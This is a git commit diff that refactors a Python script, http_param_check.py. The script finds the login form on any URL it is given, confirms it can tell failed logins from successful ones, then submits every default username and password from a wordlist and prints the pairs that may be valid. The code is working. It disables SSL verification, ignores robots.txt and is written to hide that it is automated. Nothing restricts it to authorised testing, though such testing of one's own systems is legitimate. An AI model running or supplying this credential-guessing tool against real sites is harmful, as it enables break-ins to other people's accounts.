dcce863ee013b86071e9550ba7ea5e99497a61f8
jarlold <jarlold@protonmail.com>
2020-12-31 06:21:04 -0500

    Cleaned up and functionalized http_param_check.py

--- http_param_check.py
+++ http_param_check.py
@@ -4,13 +4,6 @@ from random import choice
 import re
 import ssl
 
-
-# Detect login HTML form
-# Use an unlikely username + password to find what failed login looks like
-# Try the default_passwords.txt list
-# --> If the return - (username + password) - (attempts remaining #) matches the failed login, try again
-# --> Otherwise report the result to the user, and ask if the testing should continue
-
 url = argv[1]
 
 user_agent = [
@@ -27,27 +20,22 @@ password_keywords = ["password"]
 # Like above but for determining if a page is a failed login or a successful login
 login_failure_keywords = ["incorrect", "login failed", "invalid"]
 
-# Disables SSL verificaton, this is a security risk and makes the script vulernable to MiTM and false-host
-# attacks
-ssl._create_default_https_context = ssl._create_unverified_context
+# Load in the list of default username and passwords to try out
+with open("default_passwords.txt", 'r') as opn:
+    default_passwords = opn.readlines()
 
-# Change some settings so it's not super-clear that we're an automated script.
+# The main browser object, used everywhere so it gets to be up here
 br = mechanize.Browser()
-br.set_handle_robots(False)
-#br.addheaders = [('User-agent:', choice(user_agent))]
 
-# Finally open up with webpage
-r = br.open(url)
 
 # Will find a form with 2 controls and a username prompt or 2 controls and a password prompt
-# In the event of a double-matfh will prioritize the last form over the first one
+# In the event of a double-match will prioritize the last form over the first one
 def find_login_form(br): 
     login_form = None
     username_control = None
     password_control = None
 
     for l in br.forms(): 
-
         for i in l.controls: 
             for k in username_keywords: 
                 if (i.name and k in i.name) or (i.id and k in i.id): # IS TO GO
@@ -61,57 +49,79 @@ def find_login_form(br):
     if login_form:
         return login_form, username_control, password_control
 
+
 # Assuming a form is already selected, will try a username and password combination and return the result.
+# Will also read the page, and remove the username and password from the page
 def try_username_password(br, user_control, pass_control, username, password):
     br[str(user_control.name)] = username
     br[str(pass_control.name)] = password
-    return br.submit()
+    return br.submit().read().replace(username, '').replace(password, '')
+
 
 # Will take a string of HTML and try to determine if it's a successful login page
 # Returns false if failure, returns True if not-failure
-def is_page_login_success(page, normal_page):
+def is_page_login_success(page, original_page):
     for i in login_failure_keywords:
-        if i in page and not i in normal_page:
+        if i in page and not i in original_page:
             return False
     return True
 
-# Find the form and select it in the browser
-login_form, username_control, password_control  = find_login_form(br)
-br.form = login_form
-
-# Load in the list of default username and passwords to try out
-with open("default_passwords.txt", 'r') as opn:
-    default_passwords = opn.readlines()
-
-# Where we'll store the results of our dictionary attack
-login_responses = []
-
-# Update the user
-print("Trying default_passwords.txt on website login...")
 
 # Try all the passwords lol
-for i in default_passwords:
-    # Parse the password from the file
-    i = i.strip().strip("\n")
-    username, password = i.split(" ") if len(i.split(" ")) == 2 else (i, "")
+def try_all_passwords(login_form, username_control, password_control, original_page):
+    login_responses = []
+    for i in default_passwords:
+        # Parse the password from the file
+        i = i.strip().strip("\n")
+        username, password = i.split(" ") if len(i.split(" ")) == 2 else (i, "")
 
-    # Try the username + password combo
-    br.form = login_form # reselect the form each time
-    res = try_username_password(br, username_control, password_control, username, password).read().replace(username, '').replace(password, '')
+        # Try the username + password combo
+        br.form = login_form # reselect the form each time
+        res = try_username_password(br, username_control, password_control, username, password)
 
-    # If the result doesn't look too much like a failure, log it!
-    if is_page_login_success(res, r) : # 'r' is the response from when we first opened the login page (above)
-       login_responses.append( (username, password, res) )
-
-
-# If too many responses come back valid, show some skepticism
-if len(login_responses) > 0.2 * len(default_passwords):
-    print("Error in detecting page responses (too many valid), not trying default passwords")
-    exit()
-
-# Print possible valid logins
-print("The following usernames + passwords *MAY* be valid:")
-for i in login_responses:
-    print("  --> " + i[0] + " " + i[1])
+        # If the result doesn't look too much like a failure, log it!
+        if is_page_login_success(res, original_page):
+            login_responses.append( (username, password, res) )
+    return login_responses
 
 
+# Checks if the response verification we're using we'll work on this page
+# (Checks if is_page_login_success actually works on this site)
+# Will return True if the function works correctly, will return False otherwise
+def verify_success_function(login_form, username_control, password_control, original_page):
+    br.form = login_form # select the login form
+    res = try_username_password(br, username_control, password_control, 'asdlkjwial', 'safeakj')
+    return not is_page_login_success(res, original_page)
+
+
+def main():
+    # Disables SSL verificaton, this is a security risk and makes the script vulernable to MiTM and false-host
+    # attacks
+    ssl._create_default_https_context = ssl._create_unverified_context
+
+    # Change some settings so it's not super-clear that we're an automated script.
+    br.set_handle_robots(False)
+
+    # Finally open up the webpage
+    original_page = br.open(url)
+
+    # Find the form and select it in the browser
+    login_form, username_control, password_control = find_login_form(br)
+    br.form = login_form
+
+    # Check to see if we're able to tell apart failed and succesful logins
+    if not verify_success_function(login_form, username_control, password_control, original_page):
+        print("Unable to tell apart login successes and failures, skipping default password test.")
+        exit()
+
+    # Try all the default passwords
+    print("Trying default_passwords.txt on website login...")
+    login_responses = try_all_passwords(login_form, username_control, password_control, original_page)
+
+    # Print possible valid logins
+    print("The following usernames + passwords *MAY* be valid:")
+    for i in login_responses:
+        print("  --> " + i[0] + " " + i[1])
+
+if __name__ == "__main__":
+    main()
